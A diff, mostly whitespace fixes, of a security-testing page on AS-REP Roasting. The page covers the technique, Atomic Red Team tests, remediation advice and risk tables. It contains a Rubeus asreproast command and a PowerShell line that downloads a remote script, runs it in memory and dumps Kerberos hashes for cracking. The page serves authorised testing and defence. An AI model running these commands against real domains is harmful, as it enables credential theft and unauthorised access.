@@ -42,13 +42,13 @@ severity_boost:
 
 ## High-Level Description
 
-Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages. 
+Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages.
 
 Preauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.
 
-For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials. 
+For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials.
 
-An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. 
+An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.
 
 Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.
 
@@ -74,7 +74,7 @@ The following tests are from [Atomic Red Team](https://github.com/redcanaryco/at
 ### Atomic Test 1: Rubeus asreproast
 
 Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
-This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
+This build targets .NET 4.5. If targeting a different version you will need to compile Rubeus
 
 **Supported Platforms:** windows
 
@@ -83,6 +83,7 @@ cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_fo
 ```
 
 **Dependencies:**
+
 - Computer must be domain joined
 - Rubeus must exist
 
@@ -108,7 +109,6 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -122,32 +122,32 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1047 Audit
+
 Kerberos preauthentication is enabled by default. Older protocols might not support preauthentication therefore it is possible to have this setting disabled. Make sure that all accounts have preauthentication whenever possible and audit changes to setting. Windows tools such as PowerShell may be used to easily find which accounts have preauthentication disabled.
 
 ### M1027 Password Policies
+
 Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting.
 
 ### M1041 Encrypt Sensitive Information
-Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.
 
+Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.
 
 ## Detection
 
 ### Detect AS-REP Roasting Attempts (T1558.004)
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| AS-REP Roasting technique applicable | High | Credential Access |
+| Finding                              | Severity | Impact            |
+| ------------------------------------ | -------- | ----------------- |
+| AS-REP Roasting technique applicable | High     | Credential Access |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                                |
+| ------- | ------------------------------------ |
 | CWE-522 | Insufficiently Protected Credentials |
-
 
 ## References
 
